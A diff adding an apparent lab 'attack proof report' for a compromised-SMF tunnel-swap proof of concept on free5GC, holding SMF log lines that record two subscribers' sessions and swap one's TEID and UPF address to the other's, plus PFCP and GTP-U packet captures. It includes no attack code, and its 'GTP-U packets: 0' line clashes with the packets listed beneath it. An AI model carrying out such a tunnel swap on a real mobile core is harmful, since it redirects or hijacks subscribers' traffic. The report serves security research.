@@ -1,0 +1,67 @@
+==============================================
+ ATTACK PROOF REPORT — 20260304_135744
+==============================================
+
+--- SMF [ATTACK] log lines ---
+2026-03-04T08:28:04.141081200Z[36m [INFO][SMF][CTX] [0msmfconfig Info: Version[1.0.7] Description[SMF config for Compromised SMF Attack PoC (2 UPFs)]
+time="2026-03-04T08:28:43Z" level=info msg="[ATTACK] Recording session 1: SUPI=imsi-208930000000001, TEID=0x00000002, UPF_IP=10.100.200.101" module=TunnelSwapAttack
+time="2026-03-04T08:28:43Z" level=warning msg="[ATTACK] Session 1 recorded. Waiting for session 2 before swap." module=TunnelSwapAttack
+time="2026-03-04T08:28:43Z" level=warning msg="[ATTACK] Session 1 ORIGINAL: TEID=0x00000002, UPF_IP=10.100.200.101 (SUPI=imsi-208930000000001)" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=info msg="[ATTACK] Recording session 2: SUPI=imsi-208930000000002, TEID=0x00000006, UPF_IP=10.100.200.102" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="========================================" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="[ATTACK] *** SWAP EXECUTED ***" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="[ATTACK] Session 2 (SUPI=imsi-208930000000002) gets Session 1's tunnel:" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="[ATTACK]   TEID=0x00000006 → 0x00000002" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="[ATTACK]   UPF_IP=10.100.200.102 → 10.100.200.101" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="[ATTACK] Session 1 (SUPI=imsi-208930000000001) was sent ORIGINAL (will be swapped on next N2 build if triggered)" module=TunnelSwapAttack
+time="2026-03-04T08:29:03Z" level=warning msg="========================================" module=TunnelSwapAttack
+
+--- PFCP associations (SMF <-> UPFs) ---
+2026-03-04T08:28:05.175851410Z[36m [INFO][SMF][Main] [0mUPF(10.100.200.101) setup association
+2026-03-04T08:28:05.176082748Z[36m [INFO][SMF][Main] [0mUPF(10.100.200.102) setup association
+
+--- Pcap: /home/arjit/ISEA/free5gc-compose/attack_poc/captures/attack_proof_20260304_135744.pcap ---
+Size: 4096 bytes
+GTP-U packets: 0
+
+--- Sample GTP-U packets ---
+08:29:32.657922 eth0  Out IP (tos 0x0, ttl 64, id 56360, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:32.673128 eth0  In  IP (tos 0x0, ttl 64, id 26603, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:33.658803 eth0  Out IP (tos 0x0, ttl 64, id 56480, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:33.673662 eth0  In  IP (tos 0x0, ttl 64, id 26669, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:34.660501 eth0  Out IP (tos 0x0, ttl 64, id 56725, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:34.677300 eth0  In  IP (tos 0x0, ttl 64, id 26747, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:35.661510 eth0  Out IP (tos 0x0, ttl 64, id 56968, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:35.676385 eth0  In  IP (tos 0x0, ttl 64, id 26803, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:36.663279 eth0  Out IP (tos 0x0, ttl 64, id 57180, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:36.678749 eth0  In  IP (tos 0x0, ttl 64, id 26955, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:37.664812 eth0  Out IP (tos 0x0, ttl 64, id 57252, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:37.679879 eth0  In  IP (tos 0x0, ttl 64, id 27200, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:38.666058 eth0  Out IP (tos 0x0, ttl 64, id 57391, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:38.681156 eth0  In  IP (tos 0x0, ttl 64, id 27216, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:39.667298 eth0  Out IP (tos 0x0, ttl 64, id 57464, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:39.682545 eth0  In  IP (tos 0x0, ttl 64, id 27250, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:40.668939 eth0  Out IP (tos 0x0, ttl 64, id 57610, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:40.685979 eth0  In  IP (tos 0x0, ttl 64, id 27430, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
+08:29:41.670169 eth0  Out IP (tos 0x0, ttl 64, id 57798, offset 0, flags [DF], proto UDP (17), length 128)
+    10.100.200.12.2152 > 10.100.200.101.2152: UDP, length 100
+08:29:41.685180 eth0  In  IP (tos 0x0, ttl 64, id 27499, offset 0, flags [none], proto UDP (17), length 128)
+    10.100.200.101.2152 > 10.100.200.12.2152: UDP, length 100
